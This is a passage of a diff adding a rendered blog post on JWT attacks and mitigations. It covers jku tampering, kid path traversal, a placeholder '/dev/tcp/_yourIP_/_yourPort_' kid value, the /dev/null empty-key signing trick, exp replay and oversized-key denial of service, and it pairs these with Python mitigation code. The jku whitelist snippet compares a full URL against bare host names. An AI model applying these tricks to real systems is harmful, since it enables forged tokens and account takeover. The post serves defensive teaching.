+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Verify the token with additional checks</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    decoded_payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;RS256&#34;</span>], options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;require&#34;</span>: [<span style="color:#e6db74">&#34;alg&#34;</span>, <span style="color:#e6db74">&#34;kid&#34;</span>, <span style="color:#e6db74">&#34;aud&#34;</span>]})
+</span></span><span style="display:flex;"><span>    print(decoded_payload)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>ExpiredSignatureError:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Token has expired.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>InvalidTokenError:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Token is invalid.&#34;</span>)
+</span></span></code></pre></div><hr>
+<table>
+<thead>
+<tr>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Many libraries today report <code>&quot;alg&quot;: &quot;none&quot;</code> values as invalid, so choose up to date libraries.</td>
+</tr>
+<tr>
+<td>If you don&rsquo;t want to just rely on <code>&quot;alg&quot;</code> claims and libraries you use, add additional input to the verification function that will specify a supported set of algorithms and reject unsecured JWT values.</td>
+</tr>
+<tr>
+<td>Include the <code>aud</code> (audience) claim to specify the intended recipient of the token. (this prevents it from being used on different websites).</td>
+</tr>
+<tr>
+<td>Enable the issuing server to revoke tokens (on logout, for example).</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<table>
+<thead>
+<tr>
+<th><code>jku</code> JSON Web Key Set URL</th>
+</tr>
+</thead>
+</table>
+<p>Instead of embedding public keys directly using the <code>jwk</code> header parameter, some servers let you use the <code>jku</code> (JWK Set URL) header parameter to reference a <!-- raw HTML omitted -->JWK Set<!-- raw HTML omitted -->(URL) containing the key.</p>
+<p>When verifying the signature, the server fetches the relevant key from this <!-- raw HTML omitted -->URL<!-- raw HTML omitted -->(JWK Set).</p>
+<p>More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering.</p>
+<h4 id="example-4">
+  Example
+  <a href="#example-4" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>You can tamper the jku header so it will point to a web service that you are in control and server will try to load the keys from there.</p>
+<p>Example of mitigation</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>permitted_hosts <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;trusted-server.com&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the &#39;jku&#39; header is in the whitelist</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;jku&#34;</span> <span style="color:#f92672">in</span> decoded_payload <span style="color:#f92672">and</span> decoded_payload[<span style="color:#e6db74">&#34;jku&#34;</span>] <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> permitted_hosts:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Invalid &#39;jku&#39; header detected.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Token is valid.&#34;</span>)
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enforce a strict whitelist of permitted hosts for the <code>jku</code> header.</td>
+</tr>
+<tr>
+<td>Avoid sending tokens in URL parameters where possible.</td>
+</tr>
+<tr>
+<td>Ensure that no cookies sent in the GET request</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<table>
+<thead>
+<tr>
+<th><code>kid</code> Key ID</th>
+</tr>
+</thead>
+</table>
+<p>Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from.</p>
+<p>Depending on the format of the key, this may have a matching <code>kid</code> parameter</p>
+<p>Verification keys are often stored as a <!-- raw HTML omitted -->JWK Set<!-- raw HTML omitted -->. In this case, the server may simply look for the <!-- raw HTML omitted -->JWK with the same <code>kid</code> as the token.<!-- raw HTML omitted --> However, the JWS specification doesn&rsquo;t define a concrete structure for this ID - <!-- raw HTML omitted -->it&rsquo;s just an arbitrary string of the developer&rsquo;s choosing.<!-- raw HTML omitted --></p>
+<h4 id="example-5">
+  Example
+  <a href="#example-5" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>*some might use the <code>kid</code> parameter to point to a particular entry in a database, or even the name of a file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># For example if </span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;kid&#34;</span>:<span style="color:#e6db74">&#34;key/12345” 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># search at
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">http://*/key/12345 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">http://*/key/12345.pem 
+</span></span></span></code></pre></div><ul>
+<li>
+<p>If this parameter is also vulnerable to <a href="https://portswigger.net/web-security/file-path-traversal">directory traversal</a>, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.</p>
+<ul>
+<li>This is especially dangerous if the server also supports JWTs signed using symmetrical algorithms. In this case, an attacker could potentially point the <code>kid</code> parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.</li>
+</ul>
+</li>
+</ul>
+<pre tabindex="0"><code>&#34;kid&#34;:&#34;/dev/tcp/_yourIP_/_yourPort_
+</code></pre><ul>
+<li>You could theoretically do this with any file, but one of the simplest methods is to use <code>/dev/null</code>, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>By validating and/or sanitizing the received values make sure that you&rsquo;re not vulnerable</td>
+</tr>
+<tr>
+<td>path traversal</td>
+</tr>
+<tr>
+<td>SQL or LDAP injection</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h4 id="is-exp-checked">
+  Is exp checked?
+  <a href="#is-exp-checked" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<hr>
+<p>The “exp” claim is used to check the expiry of a token. As JWTs are often used in the absence of session information, so they do need to be handled with care - in many cases capturing and replaying someone else’s <code>JWT</code> will allow you to masquerade as that user.</p>
+<p>One mitigation against JWT replay attacks (that is advised by the JWT RFC) is to use the “exp” claim to set an expiry time for the token. It is also important to set the relevant checks in place in the application to make sure this value is processed and the token rejected where it is expired. If the token contains an “exp” claim and test time limits permit it - try storing the token and replaying it after the expiry time has passed.
+Use jwt_tool to read the content of the token: decoding includes timestamp parsing and expiry checking (timestamp in UTC)</p>
+<table>
+<thead>
+<tr>
+<th>If the token still validates in the application then this may be a security risk as the token may NEVER expire.</th>
+</tr>
+</thead>
+</table>
+<p>Example of &lsquo;mitigation&rsquo;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Decode the JWT token</span>
+</span></span><span style="display:flex;"><span>    decoded_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, public_key, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;RS256&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get the current time in UTC</span>
+</span></span><span style="display:flex;"><span>    current_time <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>utcnow()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Check if the token has expired</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;exp&#34;</span> <span style="color:#f92672">in</span> decoded_token <span style="color:#f92672">and</span> current_time <span style="color:#f92672">&gt;</span> datetime<span style="color:#f92672">.</span>utcfromtimestamp(decoded_token[<span style="color:#e6db74">&#34;exp&#34;</span>]):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Token has expired.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Token is valid.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>ExpiredSignatureError:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Token has expired.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> jwt<span style="color:#f92672">.</span>InvalidTokenError:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Token is invalid.&#34;</span>)
+</span></span></code></pre></div><hr>
+<h3 id="denial-of-service-attacks">
+  Denial-of-service attacks
+  <a href="#denial-of-service-attacks" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Like any denial-of-service attack the goal is to overwhelm the services to bring them down.</p>
+<p>An attacker could supply content using keys that would result in excessive cryptographic processing, for example, keys larger than those mandated in this specification.</p>
+<table>
+<thead>
+<tr>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Receiving agents that validate signatures and sending agents that encrypt messages need to be cautious of cryptographic processing usage when validating signatures and encrypting messages <strong>using keys larger than those mandated in this specification</strong>. Implementations should set and enforce upper limits on the key sizes they accept.</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Define the maximum allowed key size (like 2048 bits for RSA)</span>
+</span></span><span style="display:flex;"><span>max_key_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if the key size exceeds the maximum allowed size</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> key_size <span style="color:#f92672">&gt;</span> max_key_size:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Key size exceeds the maximum allowed size.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Handle the error or reject the key</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Key size is within the allowed limit.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Perform cryptographic operations using the key</span>
+</span></span></code></pre></div><p><a href="https://www.rfc-editor.org/rfc/rfc7518.html#section-5.6.1">Section 5.6.1</a>
+(Comparable Algorithm Strengths) of NIST SP 800-57 [<a href="https://www.rfc-editor.org/rfc/rfc7518.html#ref-NIST.800-57">NIST.800-57</a>]
+contains statements on largest approved key sizes that may be
+applicable.</p>
+<hr>
+<h2 id="summarry">
+  Summarry:
+  <a href="#summarry" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<ul>
+<li>Use an<code>up-to-date library</code></li>
+<li>Do not store sensitive data in payload</li>
+<li>Use asymmetric keys if the tokens are used across more than one server</li>
+<li>Use strong keys/secrets</li>
+<li>Make sure that you perform robust <code>signature verification on any JWTs that you receive</code> , and account for edge-cases such as <code>JWT</code> signed using unexpected algorithms.</li>
+<li>Make sure that you&rsquo;re not vulnerable to <a href="https://portswigger.net/web-security/file-path-traversal">path traversal</a> or SQL injection via the <code>kid</code> header parameter.</li>
+<li>Always set an<code> expiration date</code> for any tokens that you issue.</li>
+<li><code>Avoid sending tokens in URL</code> parameters where possible.</li>
+<li>Include the <code>aud</code> (audience) claim (or similar) to <code>specify the intended recipient </code>of the token. This prevents it from being used on different websites.</li>
+<li>Enable the issuing server to revoke tokens (on logout, for example).</li>
+</ul>
+<hr>
+<h3 id="links">
+  Links
+  <a href="#links" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><a href="https://portswigger.net/web-security/jwt#what-are-jwts">https://portswigger.net/web-security/jwt#what-are-jwts</a></p>
+<p><a href="https://jwt.io/introduction/">https://jwt.io/introduction/</a></p>
+<p><a href="https://openid.net/developers/how-connect-works/">https://openid.net/developers/how-connect-works/</a></p>
+<p><a href="https://www.iana.org/assignments/jose/jose.xhtml">https://www.iana.org/assignments/jose/jose.xhtml</a></p>
+<p><a href="https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology">https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology</a></p>
+<p><a href="https://portswigger.net/web-security/file-path-traversal">https://portswigger.net/web-security/file-path-traversal</a></p>
+<p><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/</a></p>
+<p><a href="https://github.com/dwyl/learn-json-web-tokens">https://github.com/dwyl/learn-json-web-tokens</a></p>
+<p><a href="https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail">https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail</a></p>
+<p>(<a href="https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail">https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail</a>)</p>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >pushingbuttons</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
